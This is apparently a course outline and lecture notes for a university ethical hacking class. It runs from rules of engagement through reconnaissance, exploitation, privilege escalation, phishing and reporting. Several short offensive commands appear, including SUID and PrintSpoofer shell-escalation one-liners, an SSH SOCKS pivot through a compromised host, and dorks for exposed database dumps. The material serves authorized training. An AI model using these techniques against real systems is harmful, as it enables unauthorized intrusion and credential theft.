course_info.title: Ethical Hacking and Penetration Testing
course_info.meeting_schedule: Monday, Wednesday, Friday - 4 hours per week

class_schedule.topic: Ethical Hacking Methodology and Professional Framework
learning_objectives: Describe the complete lifecycle of a professional penetration test engagement
Differentiate between black-box, white-box, and gray-box testing approaches
Draft a comprehensive Rules of Engagement document for a simulated client
Identify the legal statutes governing authorized security testing
readings: The Web Application Hacker's Handbook Ch. 1-2
Penetration Testing Execution Standard (PTES) full documentation
NIST SP 800-115 Technical Guide to Information Security Testing

lecture_notes.introduction: Ethical hacking is the authorized practice of probing computer systems, networks, and applications to discover security vulnerabilities that a malicious attacker could exploit. The distinction between an ethical hacker and a criminal is entirely defined by written authorization. A penetration tester operates under a strict legal framework codified in a Rules of Engagement document that specifies scope, authorized targets, testing windows, emergency procedures, and liability protections. This course teaches you to think like an adversary while operating within the boundaries of the law. The penetration testing industry has matured significantly, evolving from informal assessments into a structured discipline with recognized standards such as the Penetration Testing Execution Standard (PTES), the OWASP Testing Guide, and the NIST Technical Guide to Information Security Testing and Assessment (SP 800-115). Understanding these frameworks is not optional; it is the foundation upon which every engagement rests. Throughout this semester, you will execute each phase of a penetration test against increasingly complex lab environments, culminating in a full red team exercise.
key_concepts: PTES seven phases: Pre-engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, and Reporting
Rules of Engagement (RoE): legal document defining scope, authorized IP ranges, testing windows, emergency contacts, data handling requirements, and out-of-scope systems
Testing types: black-box (no prior knowledge), white-box (full documentation and source code access), gray-box (partial information such as network diagrams or credentials)
Legal framework: Computer Fraud and Abuse Act (CFAA 18 USC 1030), state computer crime laws, international considerations under the Budapest Convention
Certifications landscape: OSCP, CEH, GPEN, PNPT and their role in professional credibility
Liability and insurance: Errors and Omissions insurance, indemnification clauses, and handling unintended damage during testing
Difference between penetration testing, vulnerability assessment, and red team operations
Ethics beyond legality: responsible disclosure, minimizing collateral impact, respecting privacy of incidentally discovered data
Industry standards: NIST SP 800-115, OWASP Testing Guide v4.2, CREST penetration testing standards
Career paths: internal security team, consulting firm, bug bounty hunting, red team specialist
lecture_notes.demonstration: Walking through a complete sample Rules of Engagement document from a real-world engagement (sanitized), examining each section: executive summary, scope definition, target IP ranges, testing methodology, communication plan, escalation procedures, reporting format, and legal sign-off. Students will then begin drafting their own RoE for the semester lab environment.
setup_requirements: Kali Linux 2024.1 VM configured with 4GB RAM and 40GB disk
Isolated lab network accessible via VPN with 10.10.0.0/16 target range
Signed lab ethics agreement on file with department
VirtualBox or VMware Workstation for VM management

review.value: A legally binding document signed by both the testing team and the authorizing client representative before testing begins. Defines what you can test, when, how findings are reported, and emergency procedures. Without a signed RoE, any penetration testing activity is potentially criminal.

Seven repeatable phases: Pre-engagement defines scope, Intelligence Gathering collects information, Threat Modeling prioritizes vectors, Vulnerability Analysis identifies weaknesses, Exploitation validates them, Post-Exploitation demonstrates impact, Reporting communicates findings.

Black-box simulates an external attacker with no knowledge. White-box provides full access to source code and architecture to maximize coverage. Gray-box provides partial information simulating an authenticated user or partner.

The Computer Fraud and Abuse Act criminalizes unauthorized access. Even well-intentioned testing without written authorization can result in federal charges. Authorization must come from the system owner, not just the requester.

learning_objectives: Execute passive reconnaissance techniques that leave no trace on the target
Perform active reconnaissance with controlled interaction
Use OSINT frameworks to gather intelligence on organizational targets
Enumerate subdomains, email addresses, employee names, and technology stacks
readings: Open Source Intelligence Techniques by Michael Bazzell Ch. 1-5
SANS GPEN courseware: Passive and Active Reconnaissance

lecture_notes.introduction: Reconnaissance is the most critical phase of any penetration test because the quality and depth of intelligence gathered directly determines the success of subsequent exploitation attempts. Professional penetration testers typically spend 40-60 percent of their engagement time on reconnaissance before launching an exploit. Passive reconnaissance involves gathering information without directly interacting with target systems, using publicly available data sources such as WHOIS records, DNS registries, certificate transparency logs, social media profiles, job postings, and cached web content. Active reconnaissance involves direct interaction such as port scanning, banner grabbing, and DNS zone transfer attempts, which may be detected. The line between passive and active has legal and operational significance: passive recon is generally lawful regardless of authorization, while active recon constitutes interaction with target systems and should only be performed within scope. Modern OSINT tools automate much of the process, but understanding what each tool does and how to correlate findings from multiple sources separates a skilled tester from a script kiddie.
key_concepts: Passive techniques: WHOIS lookups, DNS record enumeration (A, AAAA, MX, TXT, NS, SOA), certificate transparency via crt.sh, Google dorking (site:, filetype:, intitle:, inurl:), Wayback Machine for historical content
Active reconnaissance: port scanning with Nmap, DNS zone transfer attempts, banner grabbing with Netcat, web spidering, directory bruteforcing
OSINT tools: Maltego for relationship mapping, theHarvester for email/subdomain enumeration, Shodan and Censys for device discovery, Recon-ng as modular framework, SpiderFoot for automated collection
Google dorking: site:target.com filetype:pdf, site:target.com inurl:admin, site:target.com ext:sql to discover sensitive files, admin portals, and database dumps
Subdomain enumeration: combining CT logs, DNS brute-forcing with Sublist3r and Amass, and search engine results for comprehensive inventory
Technology fingerprinting: Wappalyzer, BuiltWith, and HTTP response headers to identify web servers, frameworks, and CMS platforms
Metadata extraction: ExifTool on documents and images to extract author names, software versions, GPS coordinates, and internal hostnames
Social engineering recon: LinkedIn employee enumeration for organizational structure, email format discovery, and phishing target identification
OSINT correlation: combining findings from multiple sources into comprehensive target profile with infrastructure, technology stack, and attack vectors
lecture_notes.demonstration: Full passive and active reconnaissance against the lab target: WHOIS and DNS enumeration, subdomain discovery via crt.sh and Amass, exposed service identification with Shodan, metadata extraction from public documents, and correlation into a target profile document.
setup_requirements: Kali Linux with OSINT toolkit (theHarvester, Recon-ng, Amass, SpiderFoot)
Lab target environment with exposed services and information leaks
Shodan and Censys API keys for educational use

review.value: Passive gathers from third-party sources without touching the target. Active directly interacts with target systems and may trigger alerts. Always exhaust passive sources before moving to active techniques.
Advanced operators reveal sensitive files, admin panels, error messages, and exposed directories. Many breaches begin with information unintentionally indexed by search engines.
CAs must log certificates to CT logs. Searching crt.sh for %.target.com reveals all certificates including subdomains not publicly linked, staging environments, and internal service names.
Corporate documents contain metadata revealing internal usernames, directory paths, software versions, and printer names. ExifTool extracts this data from PDFs, Office documents, and images.

class_schedule.topic: Network Scanning and Enumeration with Nmap
learning_objectives: Perform comprehensive port scanning using multiple Nmap scan types
Enumerate services, versions, and operating systems on discovered hosts
Write and execute NSE scripts for targeted vulnerability detection
Implement scan evasion techniques to bypass basic IDS/IPS
readings: Nmap Network Scanning: The Official Guide Ch. 1-9
SANS GPEN courseware: Scanning and Enumeration
Nmap NSE script documentation at nmap.org

lecture_notes.introduction: Scanning and enumeration bridge the gap between reconnaissance and exploitation by transforming general intelligence into specific, actionable information about running services, software versions, and potential vulnerabilities. Nmap is the industry-standard tool for network discovery and security auditing. A typical workflow begins with host discovery, progresses through port scanning, advances to service and version detection, and concludes with OS fingerprinting and vulnerability scanning via NSE. Each scan type has different characteristics in terms of speed, accuracy, stealth, and information returned. Understanding these tradeoffs allows selecting the right technique: a comprehensive scan during an authorized window or a stealthy scan when testing detection. Beyond Nmap, this session covers specialized enumeration for SMB, SNMP, LDAP, and NFS protocols which often reveal critical target environment information.
key_concepts: Scan types: SYN (-sS) for fast half-open scanning, TCP connect (-sT) for non-root, UDP (-sU) for UDP services, ACK (-sA) for firewall mapping, FIN/Xmas/Null for evasion
Service version detection (-sV) uses probe-response matching to identify software and versions with intensity levels 0-9
OS fingerprinting (-O) analyzes TCP/IP stack behavior including TTL, window size, TCP options, and IP ID sequence
NSE categories: auth, brute, default, discovery, exploit, and vuln for targeted scanning
SMB enumeration: enum4linux and smbclient for shares, users, group policies, and domain information
SNMP enumeration: snmpwalk for system info, processes, software, and network config with weak community strings
LDAP enumeration: querying Active Directory for users, groups, and OUs when anonymous bind is allowed
Evasion: timing controls (-T0 to -T5), fragmentation (-f), source port manipulation, decoy scans (-D), idle scans (-sI)
Output formats: normal (-oN), grepable (-oG), XML (-oX), all combined (-oA) for documentation
lecture_notes.demonstration: Full scanning workflow against Metasploitable 2 and 3: host discovery, SYN scan of all 65535 ports, service version detection, OS fingerprinting, targeted NSE scripts (smb-vuln-ms17-010, http-enum, ssl-heartbleed), and SMB enumeration with enum4linux.
setup_requirements: Metasploitable 2 and 3 VMs on lab network

review.value: Sends SYN, awaits SYN-ACK (open) or RST (closed) without completing handshake. Faster and less logged by applications than full TCP connect. Requires root privileges.
The vuln category checks for specific CVEs: smb-vuln-ms17-010, ssl-heartbleed, http-vuln-cve2017-5638. Use --script=vuln for comprehensive scanning or target specific scripts.
Knowing port 8443 runs Tomcat 9.0.30 rather than just HTTPS enables targeted exploitation. Version-specific vulnerabilities like Ghostcat are only discoverable through accurate version detection.
UDP scanning is slow since open ports typically do not respond. Focus on common ports: 53 (DNS), 161 (SNMP), 500 (IKE), 1434 (MSSQL).

learning_objectives: Correlate scan results with known vulnerabilities using CVE databases
Evaluate severity using CVSS scoring and contextual risk analysis
Differentiate automated scanners from manual verification
Research and validate exploits from public repositories
readings: The Web Application Hacker's Handbook Ch. 4-5
Exploit-DB and Rapid7 Vulnerability Database guides

lecture_notes.introduction: Vulnerability assessment transforms raw scanning data into a prioritized list of exploitable weaknesses. This requires both automated tools and manual analysis because scanners produce false positives and miss context-dependent vulnerabilities. The goal is determining which vulnerabilities are actually exploitable given the target configuration, network position, and compensating controls. A skilled tester evaluates each finding against CVSS for baseline severity, then adjusts for environmental factors: is the service internet-facing? Does it require authentication? Are there WAFs blocking exploitation? Is there a reliable public exploit? This contextual analysis separates a useful penetration test from an automated scanner report. The session covers responsible use of exploit databases and teaches students to evaluate reliability, understand prerequisites, and test exploits safely before deployment.
key_concepts: Automated scanning with Nessus, OpenVAS, and Nuclei: configuration, credential-based vs unauthenticated, result interpretation
CVSS v3.1: Base Score components (Attack Vector, Complexity, Privileges, User Interaction, Scope, CIA Impact), Temporal and Environmental scores
False positive identification: manual verification through testing, banner analysis, and configuration review
Exploit research: CVE lookup in NVD, Exploit-DB via searchsploit, Metasploit modules, GitHub PoC repositories
Vulnerability chaining: combining low-severity findings into high-severity attack paths
Risk prioritization: ranking by exploitability, business impact, and remediation effort beyond raw CVSS
Zero-day vs N-day: unknown vulnerabilities versus known but unpatched, and how each affects testing
Exploit reliability: evaluating PoC code stability, checking prerequisites, sandboxed testing first
Compliance scanning vs penetration testing: checking CVEs is not demonstrating exploitability
lecture_notes.demonstration: Running OpenVAS against the lab network, triaging results: confirming true positives by cross-referencing versions with NVD, identifying false positives from detection inaccuracies, researching exploits via searchsploit, and evaluating Metasploit module source code.
setup_requirements: Lab targets with various severity vulnerabilities

review.value: Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity (Low/High), Privileges Required (None/Low/High), User Interaction (None/Required), Scope, CIA Impact. A 9.8 means network-accessible, low complexity, no privileges, no interaction.
searchsploit apache 2.4.49 returns matching exploits. Use -m to mirror locally. Always read code before running: check hardcoded IPs, understand behavior, verify version match.
Scanner flags based on version banner, but vendor backported fix without changing string. Verify: check actual build number, attempt exploit in lab, review configuration.
Information disclosure reveals internal API, SSRF accesses it, command injection leads to RCE. Each is Medium individually, but the chain produces Critical impact.

learning_objectives: Navigate Metasploit architecture including modules, payloads, encoders, and post modules
Select, configure, and execute exploits against identified vulnerabilities
Generate custom payloads with msfvenom for different platforms
Establish and manage Meterpreter sessions
readings: Metasploit: The Penetration Tester's Guide Ch. 3-7

lecture_notes.introduction: Metasploit is the most widely used exploitation framework, providing a structured platform for developing, testing, and executing exploit code. The framework contains over 2,000 exploit modules, 500+ auxiliaries, and hundreds of post-exploitation modules. However, Metasploit is a tool, not a substitute for understanding. Relying exclusively on automated exploitation without understanding what each module does is a hallmark of an unskilled tester. This session teaches reading module source code, understanding exploit mechanics, selecting payloads for the network environment, and handling failed exploitation. We also cover msfvenom for standalone payloads used in social engineering and client-side attacks.
key_concepts: Architecture: exploits (trigger vulnerabilities), payloads (post-exploitation code), encoders (obfuscation), nops (padding), auxiliaries (scanning), post modules (post-exploitation)
msfconsole workflow: search, use, show options, set parameters, check exploitability, exploit/run
Payload types: singles (self-contained), stagers (establish channel), stages (delivered over channel), Meterpreter (advanced in-memory)
Payload selection: reverse_tcp when target reaches listener, bind_tcp for direct access, reverse_https for encrypted blending, stageless for unreliable connections
msfvenom: executables, shellcode, platform-specific payloads (Python, PHP, Java, PowerShell)
Meterpreter: file operations, process migration, network pivoting (route, portfwd), credential harvesting (hashdump, kiwi), screenshot, keylogging
Handler management: multi/handler for callbacks, session management, backgrounding
Exploit reliability: reading source code, checking Rank, understanding crash potential
Evasion: default payloads detected by AV, encoding limitations, when custom tooling is needed
lecture_notes.demonstration: Complete exploitation: EternalBlue (MS17-010) against Windows 7 SP1, selecting meterpreter/reverse_tcp, exploiting, demonstrating session capabilities (sysinfo, getuid, hashdump, screenshot, portfwd), then Tomcat manager upload against Metasploitable.
setup_requirements: Windows Defender disabled on target for initial learning

review.value: Advanced in-memory payload that never touches disk, using encrypted channel. Provides file ops, process manipulation, pivoting, credential harvesting, and keylogging. migrate moves it into another process.
Reverse shells have target connect back to attacker, bypassing inbound firewalls. Bind shells listen on target. Reverse preferred since outbound connections are less restricted.
Staged (windows/meterpreter/reverse_tcp) sends small stager first. Stageless (underscore: meterpreter_reverse_tcp) includes everything. Use stageless when connections may be interrupted.
Automate tasks: enum_logged_on_users, local_exploit_suggester for privilege escalation, manage/migrate. Save time and ensure thoroughness.

class_schedule.topic: Web Application Attacks: SQL Injection and Cross-Site Scripting
learning_objectives: Identify and exploit all major SQL injection types
Demonstrate reflected, stored, and DOM-based XSS attacks
Use Burp Suite as the primary web application testing platform
Implement and verify defenses against SQLi and XSS
readings: The Web Application Hacker's Handbook Ch. 6-12
OWASP Testing Guide v4.2: Injection and XSS sections

lecture_notes.introduction: Web applications represent the largest attack surface for most organizations, and injection vulnerabilities remain among the most impactful findings. SQL injection manipulates database queries through application inputs, potentially extracting databases, modifying data, or executing OS commands. Cross-Site Scripting injects malicious JavaScript into pages viewed by other users, enabling session hijacking, credential theft, and keylogging. These two classes account for a significant portion of web breaches. This session covers the full taxonomy from straightforward UNION injection to blind techniques extracting data one bit at a time. On XSS, we examine reflected, stored, and DOM-based variants. Burp Suite serves as our primary platform providing proxy interception, scanning, request manipulation, and payload encoding.
key_concepts: SQL injection types: UNION-based, error-based, blind boolean, blind time-based, out-of-band
Exploitation workflow: detect injection, determine DB type, enumerate tables, extract data, escalate to OS commands where possible
sqlmap automation: detection, exploitation, enumeration, OS shell access
XSS types: reflected (URL parameters), stored (persisted in database), DOM-based (client-side JS manipulation)
XSS exploitation: session hijacking via cookie theft, credential harvesting, keylogging, BeEF integration
Burp Suite: proxy interception, Repeater for manipulation, Intruder for automation, Scanner for detection, Decoder for encoding
Defenses: parameterized queries for SQLi, CSP headers and output encoding for XSS, input validation as defense-in-depth
OWASP Top 10: A03:2021 Injection, A07:2021 XSS
Authentication bypass via SQL injection in login forms
lecture_notes.demonstration: Multi-stage attack against DVWA and Juice Shop: Burp Suite intercept, UNION-based SQL injection extracting users table, blind injection with sqlmap, stored XSS capturing admin session cookies, using stolen session for admin access.
setup_requirements: Burp Suite Community Edition as browser proxy
OWASP Juice Shop as Docker container

review.value: Parameterized queries are the only reliable defense: the database treats parameters as values, never executable SQL. Input validation and WAFs are supplementary but bypassable.
When results are not displayed, data is extracted through inference: boolean conditions change page content, time delays indicate true/false. sqlmap automates the character-by-character extraction.
Every user viewing the infected page is attacked without clicking a link. A stored XSS in a forum post or profile can compromise every visitor including administrators.
CSP headers restrict script execution to approved sources, blocking injected inline scripts. Requires careful configuration; unsafe-inline negates the protection.

learning_objectives: Execute online password attacks with Hydra and Medusa
Perform offline cracking with Hashcat and John the Ripper
Exploit credential reuse, defaults, and password spraying
Analyze password storage mechanisms and weaknesses
readings: Penetration Testing: A Hands-On Introduction Ch. 9

lecture_notes.introduction: Passwords remain the most common and most frequently compromised authentication mechanism. Password attacks are core to penetration testing because weak, reused, and default credentials provide access in the majority of engagements. Online attacks are limited by network latency and lockout. Offline attacks crack hashes without constraints, limited only by GPU power. A single RTX 4090 tests approximately 165 billion MD5 hashes, 65 billion NTLM, or 288,000 bcrypt hashes per second. Understanding these capabilities is essential for both attacking and advising clients. This session covers the full spectrum from targeted credential stuffing to exhaustive brute-force, including defensive analysis of hashing algorithms for remediation recommendations.
key_concepts: Online attacks with Hydra: SSH, FTP, SMB, RDP, HTTP forms, databases; rate limiting and lockout management
Password spraying: common passwords against many accounts to avoid lockout
Hashcat: GPU-accelerated, 300+ hash types, dictionary (-a 0), combination (-a 1), mask (-a 3), rules (-a 0 -r rules/best64.rule)
John the Ripper: CPU-based, intelligent mangling, auto hash detection, incremental mode
Hash identification: hashid for format recognition (MD5: 32 hex, SHA-256: 64 hex, bcrypt: $2b$, NTLM: 32 hex)
Wordlists: RockYou (14M), SecLists, custom from OSINT, CeWL for website scraping
Hash analysis: MD5 (broken), SHA-256 (fast, needs salt), bcrypt (slow, adaptive), Argon2 (memory-hard, best), NTLM (unsalted MD4)
Credential reuse: testing across systems, breach database correlation
Default credentials: manufacturer defaults on devices, printers, IoT, web admin panels
lecture_notes.demonstration: Multi-vector attack: Hydra against SSH, extracting NTLM hashes with Meterpreter hashdump, Hashcat cracking with dictionary plus rules, password spraying against simulated AD, comparing crack times for MD5, NTLM, SHA-256, and bcrypt.
setup_requirements: Kali with Hashcat, John, Hydra, Medusa

review.value: Dictionary (-a 0): each word. Rules: mutations (capitalize, append numbers, leet). Mask (-a 3): character class patterns. Combination (-a 1): two wordlists. Rules offer the best speed-to-coverage balance.
Unsalted MD4. Identical passwords produce identical hashes across all systems. At 65+ billion/second GPU speed, passwords under 8 characters crack in minutes.
One password against all accounts, wait for lockout reset, try next. Effective against Season+Year and Company+Number patterns common in weak policies.
bcrypt or Argon2id, minimum 12 characters, MFA, and checking against breach databases at creation time.

learning_objectives: Capture and crack WPA2-PSK handshakes with aircrack-ng
Execute deauthentication attacks for handshake capture
Perform evil twin and rogue AP attacks in controlled lab
Assess wireless security including WPA3 improvements
readings: Kali Linux Revealed Ch. 11: Wireless Attacks

lecture_notes.introduction: Wireless networks extend the attack surface beyond physical boundaries. Despite improvements, WPA2-PSK remains vulnerable to offline dictionary attacks with weak keys, and rogue AP attacks bypass encryption entirely. WPA2-Enterprise with 802.1X is stronger but complex. WPA3 SAE addresses offline attacks through Simultaneous Authentication of Equals, but slow adoption and transition mode vulnerabilities persist. This session covers aircrack-ng for handshake capture and cracking, deauthentication attacks, evil twin attacks with hostapd, and PMKID attacks requiring no client handshake. Wireless testing requires specialized hardware: an adapter supporting monitor mode and packet injection.
key_concepts: Wireless recon: airodump-ng for AP and client discovery, SSID, BSSID, channel, encryption, clients
WPA2-PSK handshake capture: monitor mode with airmon-ng, targeting BSSID/channel with airodump-ng, EAPOL capture
Deauthentication: spoofed deauth frames with aireplay-ng forcing reconnection and handshake capture
Handshake cracking: aircrack-ng with dictionary or Hashcat mode 22000 with GPU
PMKID attack: capturing from first EAPOL message without handshake using hcxdumptool and hcxpcapngtool
Evil twin: rogue AP with same SSID using hostapd, captive portal with dnsmasq for DHCP/DNS
WPA2-Enterprise attacks: hostapd-mana rogue RADIUS capturing PEAP/MSCHAPv2 from misconfigured clients
WPA3 SAE: password-authenticated key exchange preventing offline dictionary attacks
Wireless IDS evasion: channel hopping, low power, timing attacks
lecture_notes.demonstration: Complete wireless attack: airodump-ng reconnaissance, targeting WPA2-PSK network, deauthentication for handshake capture, cracking with aircrack-ng and Hashcat, evil twin with hostapd and hotel login captive portal.

review.value: PMK derived directly from passphrase and SSID. Captured handshake allows offline dictionary attacks. Weak passphrases under 12 characters crackable with GPU.
802.11 management frames are unauthenticated in WPA2. Spoofed deauth forces disconnection and reconnection, generating capturable handshake. WPA3 802.11w mitigates this.
Clients auto-reconnect to known SSIDs. Rogue AP with target SSID and stronger signal lures clients for MITM and credential harvesting.
Zero-knowledge proof protocol where both parties prove password knowledge without revealing it. Capturing the exchange does not enable offline attacks.

learning_objectives: Establish persistence on compromised systems
Pivot through compromised hosts to unreachable network segments
Exfiltrate data through covert channels
Document post-exploitation activities for reporting
readings: MITRE ATT&CK Persistence and Lateral Movement

lecture_notes.introduction: Post-exploitation transitions from proving a vulnerability exists to demonstrating real business impact. After initial access, the tester determines what an attacker could achieve: accessing sensitive data, lateral movement, privilege escalation, and persistent access. This answers the critical question: how bad would exploitation be? Pivoting through compromised hosts reaches internal targets like database servers and domain controllers not directly accessible from outside. Persistence simulates APT behavior, and data exfiltration demonstrates the ultimate risk. Every action must be documented with timestamps, commands, and evidence for the report.
key_concepts: Windows persistence: scheduled tasks, registry run keys, WMI subscriptions, DLL hijacking, services, startup folder, COM hijacking
Linux persistence: cron, systemd services, SSH authorized_keys, bashrc, LD_PRELOAD, PAM backdoors
Meterpreter pivoting: autoroute, portfwd, socks_proxy module
SSH tunneling: local (-L), remote (-R), dynamic SOCKS (-D), ProxyChains integration
Lateral movement: Pass-the-Hash, PsExec, WMI, WinRM, SMB tool transfer
Data exfiltration: DNS tunneling, HTTPS POST, ICMP tunneling, steganography, encrypted cloud upload
Credential harvesting: SAM database, LSASS dump (Mimikatz/kiwi), cached credentials, browser passwords, SSH keys, config files
Evidence documentation: timestamps, screenshots, command logs, network diagrams, file hashes
MITRE ATT&CK mapping: technique IDs for standardized reporting
lecture_notes.demonstration: Multi-stage scenario: Meterpreter on DMZ server, autoroute to internal network, port scan through pivot, exploit internal database server, extract sensitive data, DNS tunneling exfiltration, scheduled task persistence surviving reboot.
setup_requirements: Internal network (172.16.0.0/24) accessible only through pivot
Internal targets: domain controller, database server, file server

review.value: NTLM authentication accepts hashes directly. Attacker with NTLM hash authenticates without plaintext password. Mitigated by disabling NTLM, Credential Guard, MFA.
ssh -D 9050 user@compromised creates SOCKS proxy routing through the compromised host. ProxyChains enables tools: proxychains nmap -sT 172.16.0.0/24.
Every action requires timestamp, command, output, screenshot (PII redacted), and business impact statement. This forms the evidence section of each report finding.
Monitor for new scheduled tasks, registry Run key changes, unauthorized SSH keys, new systemd services, unusual cron entries. Autoruns (Windows) and auditd (Linux) provide visibility.

class_schedule.topic: Privilege Escalation on Linux and Windows
learning_objectives: Enumerate Linux privilege escalation vectors with automated and manual techniques
Enumerate and exploit Windows escalation paths including service misconfigs and token abuse
Chain findings into root/SYSTEM access
Recommend hardening for each vector

lecture_notes.introduction: Privilege escalation transforms limited access into administrative control. Most initial exploitation yields low-privileged access. To demonstrate business impact, the tester must reach root or SYSTEM. Escalation falls into misconfigurations (SUID, writable services, sudo rules, weak permissions) and software vulnerabilities (kernel exploits, driver flaws). LinPEAS and WinPEAS rapidly identify vectors, but understanding why each works is essential for exploitation and remediation. This session provides systematic methodology for both platforms covering the most common real-engagement vectors.
key_concepts: Linux: SUID/SGID binaries, sudo -l misconfigs, writable cron jobs, kernel exploits, writable /etc/passwd, capabilities (getcap), NFS no_root_squash, Docker group, PATH hijacking, writable systemd services

Windows: unquoted service paths, writable binaries, AlwaysInstallElevated, stored credentials (cmdkey), writable scheduled task scripts, SeImpersonatePrivilege (PrintSpoofer, GodPotato), DLL hijacking, kernel exploits
Automated: LinPEAS, WinPEAS, linux-exploit-suggester, windows-exploit-suggester
SUID: find binaries and check GTFOBins for escalation paths
Sudo abuse: shell escapes from editors, viewers, languages, package managers
Token impersonation: PrintSpoofer/GodPotato exploiting SeImpersonatePrivilege on IIS/MSSQL accounts
Kernel exploitation: version matching with known exploits, stability verification
Writable service paths: replacing binary with payload, service restart grants configured privileges
Docker escalation: group membership allows host filesystem mount for root access
lecture_notes.demonstration: Dual-platform lab: Linux - LinPEAS, SUID binary on GTFOBins, sudo find -exec escalation. Windows - WinPEAS, unquoted service path, malicious binary, service restart for SYSTEM.
setup_requirements: Linux VMs with intentional escalation vulnerabilities
LinPEAS, WinPEAS, exploit suggesters on Kali

review.value: Red/yellow: high-confidence escalation vectors. Green: interesting info. Plain: informational. Investigate red/yellow first.
Curated Unix binaries exploitable with SUID, sudo, or capabilities. Documents escalation commands per binary. Example: SUID find: find . -exec /bin/sh -p \;
Allows token impersonation. IIS, MSSQL, Apache accounts have it by default. PrintSpoofer.exe -i -c cmd gives SYSTEM shell.
For each vector: remove SUID bits, restrict sudo without shell escapes, quote service paths, set ACLs, remove SeImpersonate where unneeded, patch to current versions.

learning_objectives: Design and execute phishing campaigns with GoPhish
Craft pretexting scenarios from reconnaissance intelligence
Analyze social engineering vectors: vishing, smishing, physical access
Evaluate susceptibility and recommend awareness training
readings: Social Engineering: The Science of Human Hacking Ch. 1-6

lecture_notes.introduction: Social engineering exploits the human element, often the weakest link. Technical controls are bypassed when employees click phishing links, reveal credentials by phone, or hold doors open. Professional assessments measure human security posture and improve training. Over 30 percent of breaches involve phishing. This session covers phishing campaign design, pretexting for voice attacks, physical social engineering, and ethics unique to testing people. The emphasis is on OSINT-informed realistic campaigns since targeted spear-phishing is dramatically more effective than generic emails.
key_concepts: Campaign design: OSINT-based target selection, pretext development, landing pages, payload delivery (macros, HTML smuggling, credential harvesting)
GoPhish: sending profiles, email templates with tracking, landing page cloning, campaign execution and analysis
Spear-phishing vs mass phishing: targeted OSINT-based versus broad awareness testing
Vishing: phone scripts, IT support pretext, rapport building, urgency, recording consent
Physical: tailgating, badge cloning (Proxmark3), delivery/maintenance pretext, dumpster diving, USB drops
Payload development: macros, HTA, ISO/IMG for MOTW bypass, HTML smuggling, QR code phishing
Email security bypass: SPF/DKIM/DMARC analysis, typosquatting, compromised accounts, trusted sender exceptions
Metrics: click rates, credential submissions, reporting rates, time to first click, industry benchmarks
Ethics: organizational consent, protecting individuals, anonymizing results, testing awareness not humiliating
lecture_notes.demonstration: GoPhish campaign: lookalike domain, IT password expiration email, SSO login clone landing page, launching against simulated employees, analyzing open/click/submission rates.
setup_requirements: Lab email system with simulated employees

review.value: Average click rate ~30% untrained, dropping to 5-10% after training. Reporting rate equally important and should increase over time.
Leverage authority, urgency, curiosity, fear. OSINT-informed pretexts using real vendor names and recent events are dramatically more effective.
Modern gateways block executables. Bypasses: HTML smuggling, ISO/IMG containers, QR codes. Testing gateway bypass is part of the assessment.
Executive authorization required. Results anonymized. Goal is organizational resilience, not individual punishment. Debrief and training follow every campaign.

learning_objectives: Structure reports with executive and technical sections
Write findings with evidence chains, risk ratings, and remediation
Communicate risks to technical and non-technical audiences
Apply CVSS scoring and risk prioritization
readings: Sample pentest reports from public disclosures

lecture_notes.introduction: The report is the primary deliverable justifying the client investment. Technical brilliance is worthless without clear communication, appropriate prioritization, and actionable remediation. Two audiences: executives need business risk summaries for resource allocation; security teams need detailed reproduction steps and specific fixes. Professional writing requires translating exploitations into business impact, assigning consistent risk ratings, and providing specific remediation. This session covers structure, style, evidence standards, risk methodology, and common credibility-undermining mistakes.
key_concepts: Structure: cover page, table of contents, executive summary, scope/methodology, findings summary (heatmap), detailed findings, remediation roadmap, appendices
Executive summary: 1-2 pages, business-focused, overall risk posture, top critical findings, strategic recommendations, no jargon
Finding template: title, severity, CVSS score/vector, affected systems, description, reproduction steps, evidence, business impact, remediation with verification
Risk methodology: CVSS base adjusted for environmental factors, consistency, alignment with client framework
Evidence standards: reproducible proof, timestamps, screenshots, command output, redacted sensitive data, attack path diagrams
Remediation prioritization: severity/exploitability matrix, quick wins vs strategic, 30/60/90-day roadmap
Common mistakes: no evidence, generic remediation, raw tool output without analysis, missing business impact
Report delivery: walkthrough meeting, handling severity disagreements, retesting, draft vs final
Compliance mapping: linking to PCI-DSS, HIPAA, SOC 2 when applicable
lecture_notes.demonstration: Writing a SQL injection finding from Week 6 with all elements. Writing executive summary paragraph. Critiquing sample reports for missing elements and unsupported ratings.

review.value: Reader should understand: what was tested, what was found, how bad it is, what to do. No jargon. Focus on business risk.
Every finding must be reproducible by another tester. Document exact URL, parameter, payload, response, data extracted.
Same vulnerability type at same level rated consistently throughout. Document criteria in methodology section.
Not 'patch it.' Instead: 'Update Struts to 2.5.33 (CVE-2023-50164). Verify via WEB-INF/lib/struts2-core-*.jar.' Provide everything needed.

class_schedule.topic: Legal and Ethical Framework for Security Professionals
learning_objectives: Analyze legal cases involving unauthorized access
Navigate ethical dilemmas in offensive security
Understand bug bounty and coordinated disclosure
Evaluate liability, insurance, and contractual protections

lecture_notes.introduction: The legal and ethical framework is complex with severe consequences. Penetration testers operate where otherwise-criminal activities are authorized by contract, making authorization quality critical. CFAA, state laws, and international regulations create a patchwork. Beyond compliance, ethical issues arise: discovering crime during testing, encountering PII/PHI, finding third-party vulnerabilities. This session examines landmark cases, bug bounty evolution, and professional ethics. Understanding these issues is not academic; a misstep can end careers and result in prosecution.
key_concepts: CFAA: unauthorized access, exceeding authorized access, damage thresholds, protected computers, penalties up to 20 years
Landmark cases: Swartz, Van Buren (2021 Supreme Court), Auernheimer, and implications for research
Bug bounties: safe harbor, scope, disclosure timelines, payments, platforms (HackerOne, Bugcrowd, Synack)
CVD: ISO 29147, 90-day disclosure (Project Zero model), vendor communication, unresponsive vendors
Scope creep: testing unlisted subsidiaries, third-party services, shared hosting pivots
Data handling: PII, PHI, financial data, illegal activity discovery; HIPAA, PCI-DSS, breach notification obligations
E&O insurance: accidental damage coverage, professional liability, contractual indemnification
International: GDPR for EU targets, UK Computer Misuse Act, Budapest Convention
Ethics codes: (ISC)2, EC-Council, CREST conduct and enforcement
lecture_notes.demonstration: Case study workshop: three scenarios (illegal material on server, client requests competitor testing, zero-day found during engagement). Students determine correct legal and ethical actions citing specific laws and codes.

review.value: 2021 Supreme Court narrowed CFAA: 'exceeds authorized access' means accessing areas one is not entitled to, not using authorized access for unauthorized purposes. Some researcher protection but boundaries remain unclear.
Bug bounties require: good faith, following scope, not accessing data beyond demonstration, prompt reporting, no premature disclosure.
